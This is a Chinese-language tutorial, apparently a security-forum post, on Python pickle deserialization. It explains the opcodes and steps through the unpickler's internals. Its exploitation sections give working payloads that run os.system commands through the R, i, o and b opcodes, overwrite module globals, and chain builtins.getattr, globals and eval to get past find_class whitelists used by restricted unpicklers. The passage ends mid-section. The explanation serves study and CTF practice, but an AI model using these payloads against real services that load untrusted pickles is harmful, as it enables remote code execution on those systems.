0x00 知识铺垫
=========

1、 python3大多版本中反序列化的字符串默认版本为3号版本，我这里`python3.8`的默认版本为4 ，但可以传参进行修改协议版本

2、可以使用 pickletools来进行可视化

```python
import pickle
import pickletools
a=b'\x80\x03(cos\nsystem\nX\x06\x00\x00\x00whoamio.'
pickletools.dis(a)
#     0: \x80 PROTO      3
#     2: (    MARK
#     3: c        GLOBAL     'os system'
#    14: X        BINUNICODE 'whoami'
#    25: o        OBJ        (MARK at 2)
#    26: .    STOP
# highest protocol among opcodes = 2

```

**3、常用的opcode如下：**

| opcode | 描述 | 具体写法 | 栈上的变化 | memo上的变化 |
|---|---|---|---|---|
| c | 获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）会加入self.stack | c\[module\]\\n\[instance\]\\n | 获得的对象入栈 | 无 |
| o | 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） | o | 这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈 | 无 |
| i | 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） | i\[module\]\\n\[callable\]\\n | 这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈 | 无 |
| N | 实例化一个None | N | 获得的对象入栈 | 无 |
| S | 实例化一个字符串对象 | S'xxx'\\n（也可以使用双引号、\\'等python字符串形式） | 获得的对象入栈 | 无 |
| V | 实例化一个UNICODE字符串对象 | Vxxx\\n | 获得的对象入栈 | 无 |
| I | 实例化一个int对象 | Ixxx\\n | 获得的对象入栈 | 无 |
| F | 实例化一个float对象 | Fx.x\\n | 获得的对象入栈 | 无 |
| R | 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 | R | 函数和参数出栈，函数的返回值入栈 | 无 |
| . | 程序结束，栈顶的一个元素作为pickle.loads()的返回值 | . | 无 | 无 |
| ( | 向栈中压入一个MARK标记 | ( | MARK标记入栈 | 无 |
| t | 寻找栈中的上一个MARK，并组合之间的数据为元组 | t | MARK标记以及被组合的数据出栈，获得的对象入栈 | 无 |
| ) | 向栈中直接压入一个空元组 | ) | 空元组入栈 | 无 |
| l | 寻找栈中的上一个MARK，并组合之间的数据为列表 | l | MARK标记以及被组合的数据出栈，获得的对象入栈 | 无 |
| \] | 向栈中直接压入一个空列表 | \] | 空列表入栈 | 无 |
| d | 寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对） | d | MARK标记以及被组合的数据出栈，获得的对象入栈 | 无 |
| } | 向栈中直接压入一个空字典 | } | 空字典入栈 | 无 |
| p | 将栈顶对象储存至memo\_n（记忆栈） | pn\\n | 无 | 对象被储存 |
| g | 将memo\_n的对象压栈 | gn\\n | 对象被压栈 | 无 |
| 0 | 丢弃栈顶对象（self.stack） | 0 | 栈顶对象被丢弃 | 无 |
| b | 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 | b | 栈上第一个元素出栈 | 无 |
| s | 将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中 | s | 第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新 | 无 |
| u | 寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 | u | MARK标记以及被组合的数据出栈，字典被更新 | 无 |
| a | 将栈的第一个元素append到第二个元素(列表)中 | a | 栈顶元素出栈，第二个元素（列表）被更新 | 无 |
| e | 寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中 | e | MARK标记以及被组合的数据出栈，列表被更新 | 无 |

0x01 pickle反序列化过程分析
===================

所有的反序列化操作码

```python
MARK           = b'('   # push special markobject on stack
STOP           = b'.'   # every pickle ends with STOP
POP            = b'0'   # discard topmost stack item
POP_MARK       = b'1'   # discard stack top through topmost markobject
DUP            = b'2'   # duplicate top stack item
FLOAT          = b'F'   # push float object; decimal string argument
INT            = b'I'   # push integer or bool; decimal string argument
BININT         = b'J'   # push four-byte signed int
BININT1        = b'K'   # push 1-byte unsigned int
LONG           = b'L'   # push long; decimal string argument
BININT2        = b'M'   # push 2-byte unsigned int
NONE           = b'N'   # push None
PERSID         = b'P'   # push persistent object; id is taken from string arg
BINPERSID      = b'Q'   #  "       "         "  ;  "  "   "     "  stack
REDUCE         = b'R'   # apply callable to argtuple, both on stack
STRING         = b'S'   # push string; NL-terminated string argument
BINSTRING      = b'T'   # push string; counted binary string argument
SHORT_BINSTRING= b'U'   #  "     "   ;    "      "       "      " &lt; 256 bytes
UNICODE        = b'V'   # push Unicode string; raw-unicode-escaped'd argument
BINUNICODE     = b'X'   #   "     "       "  ; counted UTF-8 string argument
APPEND         = b'a'   # append stack top to list below it
BUILD          = b'b'   # call __setstate__ or __dict__.update()
GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args
DICT           = b'd'   # build a dict from stack items
EMPTY_DICT     = b'}'   # push empty dict
APPENDS        = b'e'   # extend list on stack by topmost stack slice
GET            = b'g'   # push item from memo on stack; index is string arg
BINGET         = b'h'   #   "    "    "    "   "   "  ;   "    " 1-byte arg
INST           = b'i'   # build &amp; push class instance
LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
LIST           = b'l'   # build list from topmost stack items
EMPTY_LIST     = b']'   # push empty list
OBJ            = b'o'   # build &amp; push class instance
PUT            = b'p'   # store stack top in memo; index is string arg
BINPUT         = b'q'   #   "     "    "   "   " ;   "    " 1-byte arg
LONG_BINPUT    = b'r'   #   "     "    "   "   " ;   "    " 4-byte arg
SETITEM        = b's'   # add key+value pair to dict
TUPLE          = b't'   # build tuple from topmost stack items
EMPTY_TUPLE    = b')'   # push empty tuple
SETITEMS       = b'u'   # modify dict by adding topmost key+value pairs
BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding

TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
FALSE          = b'I00\n'  # not an opcode; see INT docs in pickletools.py

# Protocol 2

PROTO          = b'\x80'  # identify pickle protocol
NEWOBJ         = b'\x81'  # build object by applying cls.__new__ to argtuple
EXT1           = b'\x82'  # push object from extension registry; 1-byte index
EXT2           = b'\x83'  # ditto, but 2-byte index
EXT4           = b'\x84'  # ditto, but 4-byte index
TUPLE1         = b'\x85'  # build 1-tuple from stack top
TUPLE2         = b'\x86'  # build 2-tuple from two topmost stack items
TUPLE3         = b'\x87'  # build 3-tuple from three topmost stack items
NEWTRUE        = b'\x88'  # push True
NEWFALSE       = b'\x89'  # push False
LONG1          = b'\x8a'  # push long from &lt; 256 bytes
LONG4          = b'\x8b'  # push really big long

_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]

# Protocol 3 (Python 3.x)

BINBYTES       = b'B'   # push bytes; counted binary string argument
SHORT_BINBYTES = b'C'   #  "     "   ;    "      "       "      " &lt; 256 bytes

# Protocol 4

SHORT_BINUNICODE = b'\x8c'  # push short string; UTF-8 length &lt; 256 bytes
BINUNICODE8      = b'\x8d'  # push very long string
BINBYTES8        = b'\x8e'  # push very long bytes string
EMPTY_SET        = b'\x8f'  # push empty set on the stack
ADDITEMS         = b'\x90'  # modify set by adding topmost stack items
FROZENSET        = b'\x91'  # build frozenset from topmost stack items
NEWOBJ_EX        = b'\x92'  # like NEWOBJ but work with keyword only arguments
STACK_GLOBAL     = b'\x93'  # same as GLOBAL but using names on the stacks
MEMOIZE          = b'\x94'  # store top of the stack in memo
FRAME            = b'\x95'  # indicate the beginning of a new frame

# Protocol 5

BYTEARRAY8       = b'\x96'  # push bytearray
NEXT_BUFFER      = b'\x97'  # push next out-of-band buffer
READONLY_BUFFER  = b'\x98'  # make top of stack readonly
```

反序列化：

```python
import pickle
import secret
class animal:
    def __init__(self):
        self.animal1="dog"
    def check(self):
        if self.animal ==secret.best:
            print(self.animal)
            print('good')

a=pickle.dumps(animal(),protocol=3)
print(a)
pickle.loads(a)
```

输出内容：

```python
b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'
```

**以下为上述序列化字符串的反序列化过程**

第一步读到 `\x80`操作码,

对应操作（识别pickle协议的操作码）通过dispatch字典索引，调用load\_proto方法

如何找到对应操作，在pickle.py中搜索操作码，然后在操作码的名称中crt+b,调转到有diapatch的地方

![image-20220918162842619.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-352fbf25b40a354cc9f81a534143c4bdff79b3b1.png)

```python
    def load_proto(self):
        proto = self.read(1)[0]
        if not 0 &lt;= proto &lt;= HIGHEST_PROTOCOL:
            raise ValueError("unsupported pickle protocol: %d" % proto)
        self.proto = proto
    dispatch[PROTO[0]] = load_proto
```

load\_proto继续往前读取一个字符`\x03`作为协议版本号 3

第二步在读取 `c`操作码

```python
b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'
```

对应操作

```python
    def load_global(self):
        module = self.readline()[:-1].decode("utf-8")#往后读到换行符作为模块名 =&gt;__main__
        name = self.readline()[:-1].decode("utf-8")#往后读到换行符作为类名 =&gt; animal
        klass = self.find_class(module, name) #然后进入find_class寻找类
        self.append(klass) #获取模块后添加到当前栈中
    dispatch[GLOBAL[0]] = load_global
```

```python
    def find_class(self, module, name):
        # Subclasses may override this.
        sys.audit('pickle.find_class', module, name)
        if self.proto &lt; 3 and self.fix_imports:
            if (module, name) in _compat_pickle.NAME_MAPPING:
                module, name = _compat_pickle.NAME_MAPPING[(module, name)]
            elif module in _compat_pickle.IMPORT_MAPPING:
                module = _compat_pickle.IMPORT_MAPPING[module]
        __import__(module, level=0)
        if self.proto &gt;= 4:
            return _getattribute(sys.modules[module], name)[0]
        else:#3号协议
            return getattr(sys.modules[module], name)
```

sys.modules中的内容 储存内置方法和引用的模块

```python
{'sys': , 'builtins': , '_frozen_importlib': , '_imp': , '_thread': , '_warnings': , '_weakref': , '_frozen_importlib_external': , 'nt': , '_io': , 'marshal': , 'winreg': , 'time': , 'zipimport': , '_codecs': , 'codecs': , 'encodings.aliases': , 'encodings': , 'encodings.utf_8': , '_signal': , 'encodings.latin_1': , '_abc': , 'abc': , 'io': , '__main__': , '_stat': , 'stat': , '_collections_abc': , 'genericpath': , 'ntpath': , 'os.path': , 'os': , '_sitebuiltins': , '_locale': , '_bootlocale': , '_codecs_cn': , '_multibytecodec': , 'encodings.gbk': , 'types': , 'importlib._bootstrap': , 'importlib._bootstrap_external': , 'warnings': , 'importlib': , 'importlib.machinery': , '_heapq': , 'heapq': , 'itertools': , 'keyword': , '_operator': , 'operator': , 'reprlib': , '_collections': , 'collections': , 'collections.abc': , '_functools': , 'functools': , 'contextlib': , 'enum': , '_sre': , 'sre_constants': , 'sre_parse': , 'sre_compile': , 'copyreg': , 're': , 'typing.io': , 'typing.re': , 'typing': , 'importlib.abc': , 'importlib.util': , 'mpl_toolkits': , 'site': , '_struct': , 'struct': , '_compat_pickle': , '_pickle': , 'pickle': , 'secret': }

```

然后`self.append(klass)`添加到当前栈中,所以当前栈中有：

```python
self=&gt; stack:[]
```

第三步在读取 `q`操作码

```python
b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'
```

对应操作

```python
    def load_binput(self):
        i = self.read(1)[0]#继续读取下一个字节，赋值给i
        if i &lt; 0:
            raise ValueError("negative BINPUT argument")
        self.memo[i] = self.stack[-1]#将栈中的栈尾(与栈顶相对)存入记忆栈中memo
    dispatch[BINPUT[0]] = load_binput
```

所以记忆栈中**存在了animal类**

```python
memo=&gt; stack:[(类)]
```

第四步在读取 `)`操作码 向当前栈中增加一个新的元组

```python
b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'
```

对应操作

```python
    def load_empty_tuple(self):
        self.append(())#向当前栈中增加一个新的元组
    dispatch[EMPTY_TUPLE[0]] = load_empty_tuple
```

所以当前栈中有：

```python
self=&gt; stack:[,()]
```

第五步在读取 `\x81`操作码 # 使用弹出两次栈，用弹出的数据创建类

```python
b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'
```

对应操作

```python
    def load_newobj(self):
        args = self.stack.pop() # 空元组()
        cls = self.stack.pop() # 
        obj = cls.__new__(cls, *args) 
        #__new__方法的作用是修改不可变类(int,String)等基本类都是不可变类，此处不需修改，所以传入元组
        self.append(obj) 将实例化后的animal压入栈中
    dispatch[NEWOBJ[0]] = load_newobj
```

所以当前栈中有：

```python
self=&gt; stack:[(对象)]
```

第五步在读取 `q`操作码

```python
b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'
```

对应操作

```python
    def load_binput(self):
        i = self.read(1)[0]#继续读取下一个字节，赋值给i
        if i &lt; 0:
            raise ValueError("negative BINPUT argument")
        self.memo[i] = self.stack[-1]#将栈中的栈尾(与栈顶相对)存入记忆栈中memo
    dispatch[BINPUT[0]] = load_binput
```

将animal对象存储到memo\[1\]的栈中，所以当前的memo栈有：

```python
memo=&gt; stack:[(类) , (对象)]
```

第六步在读取 `}`操作码

```python
b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'
```

对应操作

```python
    def load_empty_dictionary(self):
        self.append({}) 
    dispatch[EMPTY_DICT[0]] = load_empty_dictionary
```

将animal对象存储到memo\[1\]的栈中，所以当前的memo栈有：

```python
self=&gt; stack:[(对象),{}]
```

第七步在读取 `q`操作码

```python
b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'
```

对应操作

```python
    def load_binput(self):
        i = self.read(1)[0]#继续读取下一个字节 \x02 ，赋值给i
        if i &lt; 0:
            raise ValueError("negative BINPUT argument")
        self.memo[i] = self.stack[-1]#将栈中的栈尾栈顶存入记忆栈中memo
    dispatch[BINPUT[0]] = load_binput
```

将animal对象存储到memo\[1\]的栈中，所以当前的memo栈有：

```python
memo=&gt; stack:[(类) , (对象),{}]
```

第八步在读取 `X`操作码

```python
b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'
```

对应操作

```python
    def load_binunicode(self):
        len, = unpack('<i>6
        if len &gt; maxsize:
            raise UnpicklingError("BINUNICODE exceeds system's maximum size "
                                  "of %d bytes" % maxsize)
        self.append(str(self.read(len), 'utf-8', 'surrogatepass'))
        #再往后读len长度的字节数 animal（属性名） 然后存入到栈中中
    dispatch[BINUNICODE[0]] = load_binunicode
```

将animal（属性名） 然后存入到字符串中

```python
self=&gt; stack:[(对象),{},"animal"]
```

第九步在读取 `q`操作码

```python
b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'
```

对应操作

```python
def load_binput(self):
        i = self.read(1)[0]#继续读取下一个字节 \x03 ，赋值给i
        if i &lt; 0:
            raise ValueError("negative BINPUT argument")
        self.memo[i] = self.stack[-1]#将栈中的栈尾栈顶存入记忆栈中memo
    dispatch[BINPUT[0]] = load_binput
```

将animal（属性名） 然后存入到字符串中

```python
memo=&gt; stack:[(类) , (对象),{},"animal"]
```

第十步在读取 `X`操作码

```python
b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'
```

对应操作

```python
    def load_binunicode(self):
        len, = unpack('<i> 3
        if len &gt; maxsize:
            raise UnpicklingError("BINUNICODE exceeds system's maximum size "
                                  "of %d bytes" % maxsize)
        self.append(str(self.read(len), 'utf-8', 'surrogatepass')) dog
        #再往后读len长度的字节数 dog（属性值） 然后存入到栈中中
    dispatch[BINUNICODE[0]] = load_binunicode
```

将animal（属性名） 然后存入到字符串中

```python
self=&gt; stack:[(对象),{},"animal","dog"]
```

第十一步在读取 `q`操作码

```python
b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'
```

对应操作

```python
def load_binput(self):
        i = self.read(1)[0]#继续读取下一个字节 \x04 ，赋值给i
        if i &lt; 0:
            raise ValueError("negative BINPUT argument")
        self.memo[i] = self.stack[-1]#将栈中的栈尾栈顶存入记忆栈中memo
    dispatch[BINPUT[0]] = load_binput
```

将animal（属性名） 然后存入到字符串中

```python
memo=&gt; stack:[(类) , (对象),{},"animal","dog"]
```

第十二步在读取 `s`操作码

```python
b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'
```

对应操作

```python
    def load_setitem(self):
        stack = self.stack
        value = stack.pop()  #"dog"
        key = stack.pop()   #"animal"
        dict = stack[-1]    #栈顶{}
        dict[key] = value   #{"animal":"dog"}
    dispatch[SETITEM[0]] = load_setitem
```

将animal（属性名） 然后存入到字符串中

```python
self=&gt; stack:[(对象),{"animal":"dog"}]
```

第十二步在读取 `b`操作码

```python
b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'
```

对应操作

```python
    def load_build(self):
        stack = self.stack
        state = stack.pop() #{"animal":"dog"}
        inst = stack[-1] #(对象)
        setstate = getattr(inst, "__setstate__", None) 
        if setstate is not None: 
            #检查是否存在 __setstate__ 方法 一般是不存在的
            ###############################################
            setstate(state) ###########会造成任意函数调用
            ############################################
            return
        slotstate = None
        if isinstance(state, tuple) and len(state) == 2:
            state, slotstate = state
        if state:
            inst_dict = inst.__dict__
            intern = sys.intern
            for k, v in state.items():
                if type(k) is str:
                    inst_dict[intern(k)] = v
                else:
                    inst_dict[k] = v
        if slotstate:
            for k, v in slotstate.items():
                setattr(inst, k, v)
    dispatch[BUILD[0]] = load_build
```

将animal（属性名） 然后存入到字符串中

```python
self=&gt; stack:[(拥有数据的对象)
```

第十三步在读取 `.`操作码

```python
b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'
```

对应操作

```python
    def load_stop(self):
        value = self.stack.pop()
        raise _Stop(value)
    dispatch[STOP[0]] = load_stop
```

反序列结束

0x02 利用
=======

### 全局变量引入

在碰到**s操作码时，会弹出两个字符串作为键值对保存在字典中**，我们可以通过**c操作码来得到secret.best**，再使animal=secret.best，这样就成功引入了全局变量

c操作码中 find\_class ：

```python
    def load_global(self):
        module = self.readline()[:-1].decode("utf-8")
        name = self.readline()[:-1].decode("utf-8")
        klass = self.find_class(module, name)
        self.append(klass)
    dispatch[GLOBAL[0]] = load_global
```

find\_class 中的 getattr是通过 sys.modules获取变量名的或者模块的

secret也存在与sys.modules的字典中，所以 `module=secret&amp;name=best`就可以去到 secret.best的值

```python
def find_class(self, module, name):
    # Subclasses may override this.
    sys.audit('pickle.find_class', module, name)
    if self.proto &lt; 3 and self.fix_imports:
        if (module, name) in _compat_pickle.NAME_MAPPING:
            module, name = _compat_pickle.NAME_MAPPING[(module, name)]
        elif module in _compat_pickle.IMPORT_MAPPING:
            module = _compat_pickle.IMPORT_MAPPING[module]
    __import__(module, level=0)
    if self.proto &gt;= 4:
        return _getattribute(sys.modules[module], name)[0]
    else:#3号协议
        return getattr(sys.modules[module], name)
```

`于是就`可以将animal的值改为全局变量```中的secret.best

```python
import pickle
import sys

import secret
class animal:
    def __init__(self):
        self.animal="dog"
    def check(self):
        if self.animal ==secret.best:
            print(self.animal)
            print('good')

# print(sys.modules)
# a=pickle.dumps(animal(),protocol=3)
#b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'
a=b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03csecret\nbest\nq\x04sb.'
print(a)
b=pickle.loads(a)
b.check()
# cat
# good
```

### 修改全局变量

`c`操作码是通过调用`find_class`方法来获取对象，而`find_class`使用`_getattribute(sys.modules[module],name)`最终使用`getattr(sys.modules['__main__'],'secret')`来获取到相应的属性，`sys.modules`是一个全局字典，该字典是python启动后就加载在内存中的。每导入新的模块、`sys.modules`会将该模块导入字典中。

```python
print(getattr(sys.modules['__main__'],'secret'))
#
```

使用`c`操作码通过`__main__`模块索引secret模块，然后使用`} X s`等操作码构成`{"best":"binbin"}`

最后栈中剩下

```python
self=&gt;[secret(模块),{"best":"binbin"}]
```

然后使用`b`操作符，就可以修改secret模块中的beat

```python
import pickle
import sys

import secret
class animal:
    def __init__(self):
        self.animal="dog"
    def check(self):
        if self.animal ==secret.best:
            print(self.animal)
            print('good')
        else:
            print('no')

# print(sys.modules)
# a=pickle.dumps(animal(),protocol=3)
# print(sys.modules['__main__'])
#b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'
a=b'''\x80\x03c__main__\nsecret\nq\x00}q\x01X\x04\x00\x00\x00bestq\x02X\x06\x00\x00\x00binbinq\x03sbc__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'''
#a=b'''\x80\x03c__main__\nsecret\n}X\x04\x00\x00\x00bestX\x06\x00\x00\x00binbinq\x03sb.'''
#可以去掉所有q\01这类东西，因为q只是加入记忆栈，记录反序列化过程
# print(a)
b=pickle.loads(a)
b.check()
print(secret.best)

# no
# binbin
```

### 函数执行

与函数执行相关的操作码有`R,i,o,b`

在来普及一下其他操作码：

**`c`操作码**

获取一个全局对象或import一个模块（注：**会调用import语句，能够引入新的包**）会**加入self.stack**

```python
b'cbuiltins\ngetattr\n'   ===&gt;   __import__('builtins').getattr
```

**`p`操作码**

将(self.stack)栈顶对象储存至memo\_n（记忆栈）

```python
b'p2/n' =&gt; #将栈顶对象储存至memo[2]
```

 **`(`操作码**

向栈(self.stack)中插入一个merk标记

**`g`操作码**

将memo\_n的对象压栈（self.stack）

**`0`操作码**

丢弃栈顶对象（self.stack）

**`S`操作码**

`S'xxx'\n`（也可以使用双引号、\\'等python字符串形式）等效于 `X\x06\x00\x00\x00whoami`

其他可以看上面的表格

**`i`操作码**

对应的函数

```python
    def load_inst(self):
        module = self.readline()[:-1].decode("ascii") #取出一行（读到写一个\n）作为模块值
        name = self.readline()[:-1].decode("ascii") #取出一行（读到写一个\n）作为属性名
        klass = self.find_class(module, name)  #获取module模块的属性值
        self._instantiate(klass, self.pop_mark())
    dispatch[INST[0]] = load_inst
```

\_instantiate函数 调用函数

```python
    def _instantiate(self, klass, args):
        if (args or not isinstance(klass, type) or
            hasattr(klass, "__getinitargs__")):
            try:
                value = klass(*args) #执行
            except TypeError as err:
                raise TypeError("in constructor for %s: %s" %
                                (klass.__name__, str(err)), sys.exc_info()[2])
        else:
            value = klass.__new__(klass)
        self.append(value)
```

`load_inst`中的`self.pop_mark()`作为参数

```python
    def pop_mark(self):
        items = self.stack #返回当前栈中的参数
        self.stack = self.metastack.pop()
        self.append = self.stack.append
        return items #返回当前栈中的参数
```

所以命令执行的payload

```python
import pickle
import sys
a=b'\x80\x03(X\x06\x00\x00\x00whoamiios\nsystem\n.'
b=pickle.loads(a)
```

`(`操作码 向`metastack`中添加`self.stack`不然后面命令执行时`self.metastack.pop()`会报错

```python
    def load_mark(self):
        self.metastack.append(self.stack)
        self.stack = []
        self.append = self.stack.append
    dispatch[MARK[0]] = load_mark
```

**`R`操作码**

对应的函数

```python
    def load_reduce(self):
        stack = self.stack
        args = stack.pop() #弹栈作为一个参数，参数必须是元组
        func = stack[-1]# 栈中的最后一个数据作为函数，
        stack[-1] = func(*args)#并用执行结果覆盖函数
    dispatch[REDUCE[0]] = load_reduce
```

```python
self=&gt; stack:[,(whoami)]
```

成功执行`os.system('whoami')`

由于弹栈作为一个参数，参数必须是元组，所以使用操作码`\x85`,将栈顶的一个元素转化为tuple类型的数据

```python
    def load_tuple1(self):
        self.stack[-1] = (self.stack[-1],)
    dispatch[TUPLE1[0]] = load_tuple1
```

payload

```python
import pickle
a=b'\x80\x03cos\nsystem\nX\x06\x00\x00\x00whoami\x85R.'
b=pickle.loads(a)
```

**`o`操作码**

```python
    def load_obj(self):
        # Stack is ... markobject classobject arg1 arg2 ...
        args = self.pop_mark() #当前栈中所有的数据赋值给args
        cls = args.pop(0) #弹出第一个，作为类名 利用是为函数名
        self._instantiate(cls, args)
    dispatch[OBJ[0]] = load_obj
```

函数执行在value = klass(\*args)

```python
    def _instantiate(self, klass, args):
        if (args or not isinstance(klass, type) or
            hasattr(klass, "__getinitargs__")):
            try:
                value = klass(*args)
            except TypeError as err:
                raise TypeError("in constructor for %s: %s" %
                                (klass.__name__, str(err)), sys.exc_info()[2])
        else:
            value = klass.__new__(klass)
        self.append(value)
```

payload

```python
import pickle
import sys
a=b'\x80\x03(cos\nsystem\nX\x06\x00\x00\x00whoamio.'
#a=b'(cos\nsystem\nX\x06\x00\x00\x00whoamio.'
b=pickle.loads(a)
```

**`b`操作码**

执行函数

```python
    def load_build(self):
        stack = self.stack
        state = stack.pop() #{"animal":"dog"}
        inst = stack[-1] #(对象)
        setstate = getattr(inst, "__setstate__", None) 
        if setstate is not None: 
            #检查是否存在 __setstate__ 方法 一般是不存在的
            #如果存在__setstate__方法，就会调用setstate(state)
            ###############################################
            setstate(state) ###########会造成任意函数调用
            ############################################
            return
        slotstate = None
        if isinstance(state, tuple) and len(state) == 2:
            state, slotstate = state
        if state:
            inst_dict = inst.__dict__
            intern = sys.intern
            for k, v in state.items():
                if type(k) is str:
                    inst_dict[intern(k)] = v
                else:
                    inst_dict[k] = v
        if slotstate:
            for k, v in slotstate.items():
                setattr(inst, k, v)
    dispatch[BUILD[0]] = load_build
```

只有存在`__setstate__`方法，就会调用`setstate(state)`，所以要构造一个含有`__setstate__`的类

```python
import pickle
class animal:
    def __init__(self):
        self.animal="dog"
a=b'\x80\x03c__main__\nanimal\n)\x81}X\x0C\x00\x00\x00__setstate__cos\nsystem\nsbX\x06\x00\x00\x00whoamib.'
b=pickle.loads(a)

```

0x03 WAF绕过
==========

官方针对pickle的安全问题的建议是修改`find_class()`，引入白名单的方式来解决，很多CTF题都是针对该函数进行，所以搞清楚如何绕过该函数很重要。

1. 从opcode角度看，当出现`c`、`i`、`\x93`时，会调用，**所以只要在这三个opcode直接引入模块时没有违反规则即可**。
2. 从python代码来看，`find_class()`只会在解析opcode时调用一次，所以只要绕过opcode执行过程，`find_class()`就不会再调用，也就是说`find_class()`只需要过一次，通过之后再产生的函数在黑名单中也不会拦截，**所以可以通过`__import__`绕过一些黑名单。**

下面是官方文档中的例子，使用白名单限制了能够调用的模块

```python
safe_builtins = {'range','complex','set','frozenset','slice',}

class RestrictedUnpickler(pickle.Unpickler):

    def find_class(self, module, name):
        # Only allow safe classes from builtins.
        if module == "builtins" and name in safe_builtins:
            return getattr(builtins, name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %(module, name))
```

下面例子是高校战疫网络安全分享赛·webtmp中的过滤方法，只允许`__main__`模块。虽然看起来很安全，但是被引入主程序的模块都可以通过`__main__`调用修改，所以造成了变量覆盖。

```python
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == '__main__': # 只允许__main__模块
            return getattr(sys.modules['__main__'], name)
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))
```

如何绕过`find_class`函数内的限制就是pickle反序列化解题的关键

黑名单绕过

构造getattr函数

可以使用builtins模块构造getattr函数，不再经过find\_class,就能绕过WAF实现任意函数执行

### 不经过find\_class

绕过在find\_class中的限制

使用`R`操作码

```python
#1、下面字符串中#号后面的字符要删除，不然会报错
a=b'''cbuiltins\ngetattr\np0\ncbuiltins\ndict\np1\nX\x03\x00\x00\x00get\x86Rp2\n0g2\ncbuiltins\nglobals\n)RX\x0C\x00\x00\x00__builtins__\x86Rp3\n0g0\ng3\nX\x04\x00\x00\x00eval\x86Rp4\n0g4\nX\x21\x00\x00\x00__import__('os').system('whoami')\x85R.'''
b=b'''cbuiltins
getattr
p0 
(cbuiltins
dict
S'get'
tRp1
cbuiltins
globals
)Rp2
00g1
(g2
S'__builtins__'
tRp3
0g0
(g3
S'eval'
tR(S'__import__("os").system("whoami")'
tR.
'''

#都等价于下面的代码
getattr = __import__('builtins').getattr
dict = __import__('builtins').dict
get = getattr(dict, 'get')
__builtins__=get(__import__('builtins').globals(), '__builtins__')
eval = getattr(__builtins__, 'eval')
eval('__import__("os").system("whoami")')

#注意
#只可通过__import__来导入对象，所以获取__builtins__中的对象需要__import__('builtins').xx（Python2中是__builtin__）
#由上一条，虽然__import__转手了__builtins__，但无法获取，还是得通过globals()['__builtins__']获取
#字典无法直接取值，需获取到dict的类方法get，传dict实例和key进去

```

使用`o`操作码

```python
